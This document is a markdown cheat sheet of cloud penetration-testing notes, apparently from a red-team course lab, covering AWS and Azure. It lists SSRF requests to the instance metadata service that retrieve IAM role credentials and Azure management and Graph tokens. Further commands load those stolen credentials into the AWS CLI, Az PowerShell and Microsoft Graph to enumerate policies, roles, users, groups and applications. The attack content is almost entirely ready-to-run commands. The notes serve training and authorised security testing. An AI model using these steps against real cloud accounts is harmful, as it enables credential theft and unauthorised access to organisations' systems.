# Cloud Pentest - Notes

**References:**

- https://github.com/RedTeamOperations/RedCloud-OS?tab=readme-ov-file

## Courses

- [Multi Cloud Red Team Analyst](https://cyberwarfare.live/product/multi-cloud-red-team-analyst-mcrta/)

## AWS

**References:**

- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf

**Commands:** 

Search S3 Buckets: `python3 cloud_enum.py -k "NAME"` 

SSRF URL for Token and key: `http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role`

Configure & Validate Temporary Credential in AWS CLI:

1. aws configure set aws_access_key_id  [key-id] --profile ec2
2.  aws configure set aws_secret_access_key  [key-id] --profile ec2
3.  aws configure set aws_session_token [token] --profile ec2

Get the Managed Policy Attached to EC2 Instance : `aws iam list-attached-role-policies --role-name ec2-role --profile ec2`

List the IAM groups that the specified IAM user belongs to: `aws iam list-groups-for-user --user-name [user-name] --profile ec2`

 List the names of the inline policies embedded in the specified IAM role : ` aws iam list-role-policies --role-name [role-name] --profile ec2`

List all manages policies that are attached to the specified IAM user : `aws iam list-attached-user-policies --user-name [user-name] --profile ec2` 

Lists all managed policies that are attached to the specified IAM Group : `aws iam list-attached-group-policies --group-name [group-name] --profile ec2`

## AZURE

**References:** 

- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#cea8

**Commands:** 

**Note:** API Version in this lab -> 2018-02-01

Instance Details: `curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=[API-VERSION]"`

Retrieve Management Token: `curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=[API-VERSION]&resource=https://management.azure.com/"`

Retrieve Graph Token: `curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=[API-VERSION]&resource=https://graph.microsoft.com/"`

**Note:** Decode JWT Token to retrieve data.

Configure access token in az powershell cli:

1. `$token = “AccessToken”`	
2. `Connect-AzAccount -AccessToken $token -AccountId [Tenant ID]`

Get role assignment of managed identity: `Get-AzRoleAssignment -ObjectId [PrincipalID-ManagedIdentity]`

List role assignment: `Get-AzRoleAssignment`

Get role assignment of name: `Get-AzroleDefinition  -Name [RoleDefinitionName]`

Connect to Graph using token: `$token = "[TOKEN]" ; Connect-MgGraph -AccessToken ($token |ConvertTo-SecureString -AsPlainText -Force)`

Enumerate Groups: `Get-MgGroup`

Enumerate Group Membership: `Get-MgGroupMember -GroupId [GroupId]`

Enumerate Users: `Get-MgUser`

Enumerate Applications: `Get-MgApplication`

Enumerate Application Owner: `Get-MgApplicationOwner -ApplicationId "[ID]"`